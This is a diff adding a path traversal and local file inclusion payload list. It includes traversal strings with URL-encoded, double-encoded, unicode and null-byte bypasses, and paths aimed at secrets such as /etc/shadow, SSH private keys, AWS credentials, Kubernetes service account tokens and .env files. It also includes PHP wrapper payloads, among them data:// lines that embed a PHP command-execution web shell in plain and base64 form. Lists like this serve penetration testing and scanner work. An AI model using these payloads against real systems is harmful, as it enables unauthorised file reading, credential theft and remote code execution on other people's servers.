@@ -1,0 +1,129 @@
+# Path traversal / LFI payloads
+
+# --- Linux classics ---
+../
+../../
+../../../
+../../../../
+../../../../../
+../../../../../../
+../../../../../../../
+../../../../../../../../../../etc/passwd
+/etc/passwd
+/etc/shadow
+/etc/hostname
+/etc/hosts
+/etc/issue
+/etc/os-release
+/etc/group
+/etc/sudoers
+/etc/crontab
+/etc/ssh/sshd_config
+/root/.ssh/id_rsa
+/root/.bash_history
+/root/.aws/credentials
+/proc/self/environ
+/proc/self/cmdline
+/proc/self/status
+/proc/self/fd/0
+/proc/net/tcp
+/proc/version
+/var/log/auth.log
+/var/log/apache2/access.log
+/var/log/nginx/access.log
+/var/www/html/index.php
+
+# --- Windows classics ---
+..\
+..\..\
+..\..\..\
+..\..\..\..\windows\win.ini
+c:\windows\win.ini
+c:\windows\system32\drivers\etc\hosts
+c:\boot.ini
+c:\windows\system32\config\SAM
+c:/inetpub/wwwroot/web.config
+c:/xampp/apache/logs/access.log
+c:/xampp/mysql/bin/my.ini
+
+# --- URL-encoded ---
+..%2f..%2f..%2fetc%2fpasswd
+..%252f..%252f..%252fetc%252fpasswd
+..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
+..%2e%2e%2f..%2e%2e%2fetc%2fpasswd
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+%2e%2e/%2e%2e/%2e%2e/etc/passwd
+
+# --- Double URL-encoded ---
+%252e%252e%252f%252e%252e%252fetc%252fpasswd
+%252e%252e%255c%252e%252e%255cwindows%255cwin.ini
+
+# --- Unicode bypasses ---
+..%u2215..%u2215etc%u2215passwd
+..%e2%81%84..%e2%81%84etc%e2%81%84passwd
+
+# --- Null byte bypass (old PHP) ---
+/etc/passwd%00
+/etc/passwd%00.jpg
+/etc/passwd%00.html
+../../../etc/passwd%00
+
+# --- Extension-stripping bypass ---
+../../../etc/passwd#.jpg
+../../../etc/passwd?.jpg
+../../../etc/passwd%23.jpg
+
+# --- Absolute bypass (when prefix is added) ---
+....//....//....//etc/passwd
+....\/....\/....\/etc/passwd
+.././.././.././etc/passwd
+..;/..;/..;/etc/passwd
+
+# --- PHP wrappers ---
+php://filter/convert.base64-encode/resource=index.php
+php://filter/read=convert.base64-encode/resource=/etc/passwd
+php://filter/convert.base64-encode/resource=../config.php
+php://filter/string.toupper/resource=/etc/passwd
+php://input
+data://text/plain,<?php system($_GET['c']); ?>
+data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==
+expect://id
+phar://archive.phar
+zip://shell.zip
+compress.zlib://file.gz
+
+# --- Java Spring / ZipSlip ---
+..%252f..%252f..%252fetc%252fpasswd
+..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd
+
+# --- Container-aware (Docker / k8s) ---
+/proc/1/cgroup
+/proc/1/environ
+/proc/1/mounts
+/run/secrets/kubernetes.io/serviceaccount/token
+/run/secrets/kubernetes.io/serviceaccount/ca.crt
+/run/secrets/kubernetes.io/serviceaccount/namespace
+/var/run/secrets/kubernetes.io/serviceaccount/token
+
+# --- Cloud secrets ---
+/root/.aws/credentials
+/home/ubuntu/.aws/credentials
+/.aws/credentials
+/root/.ssh/id_rsa
+/home/ubuntu/.ssh/authorized_keys
+/.gcloud/credentials.db
+/var/run/secrets/google/default/credentials.json
+/root/.docker/config.json
+
+# --- Application config files ---
+.env
+../.env
+../../.env
+../../../.env
+config.php
+wp-config.php
+../wp-config.php
+database.yml
+application.properties
+appsettings.json
+web.config
